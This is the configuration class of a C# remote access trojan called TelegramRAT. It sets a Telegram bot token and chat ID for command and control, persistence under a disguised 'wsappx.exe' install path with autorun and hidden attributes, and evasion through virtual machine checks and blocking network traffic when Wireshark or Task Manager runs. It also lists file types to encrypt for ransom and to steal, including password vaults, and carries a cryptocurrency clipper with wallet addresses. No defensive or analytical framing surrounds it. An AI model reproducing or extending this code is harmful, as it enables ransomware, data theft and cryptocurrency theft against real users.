namespace TelegramRAT;

internal sealed class config
{
	public const string TelegramToken = "5687152406:AAFin_LYFhJGLydMgYheeUDec-2orew51aM";

	public const string TelegramChatID = "2024893777";

	public static int TelegramCommandCheckDelay = 1;

	public static bool AdminRightsRequired = true;

	public static bool AttributeHiddenEnabled = true;

	public static bool AttributeSystemEnabled = true;

	public static bool MeltFileAfterStart = true;

	public static string InstallPath = "C:\\Users\\Static\\wsappx.exe";

	public static bool AutorunEnabled = true;

	public static string AutorunName = "wsappx";

	public static bool ProcessBSODProtectionEnabled = true;

	public static bool HideConsoleWindow = true;

	public static bool PreventStartOnVirtualMachine = true;

	public static int StartDelay = 2;

	public static bool BlockNetworkActivityWhenProcessStarted = true;

	public static string[] BlockNetworkActivityProcessList = new string[9] { "taskmgr", "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };

	public static string[] EncryptionFileTypes = new string[27]
	{
		".lnk", ".png", ".jpg", ".bmp", ".psd", ".pdf", ".txt", ".doc", ".docx", ".xls",
		".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", "py",
		".asp", ".aspx", ".html", ".xml", ".jar", ".cs", ".py"
	};

	public static long GrabFileSize = 6291456L;

	public static string[] GrabFileTypes = new string[21]
	{
		".kdbx", ".png", ".jpg", ".bmp", ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls",
		".xlsx", ".ppt", ".pptx", ".odt", ".sql", ".php", ".py", ".html", ".xml", ".json",
		".csv"
	};

	public static bool AutoStealerEnabled = false;

	public static bool ClipperEnabled = false;

	public static string bitcoin_address = "1DJ5VetDBuQnmDZjRHRgEiCwYwvc6PSwu8";

	public static string etherium_address = "0x357C0541F19a7755AFbF1CCD824EE06059404238";

	public static string monero_address = "42Pwy6Xe4mPTz3mLap7AB5Jjd9NBt1MWjiqyvEFx3Fn8Fo9cRw9aJUHE1iTXEpUbQacMNiSxYejBKFE7UdGnyEncEECJey9";
}
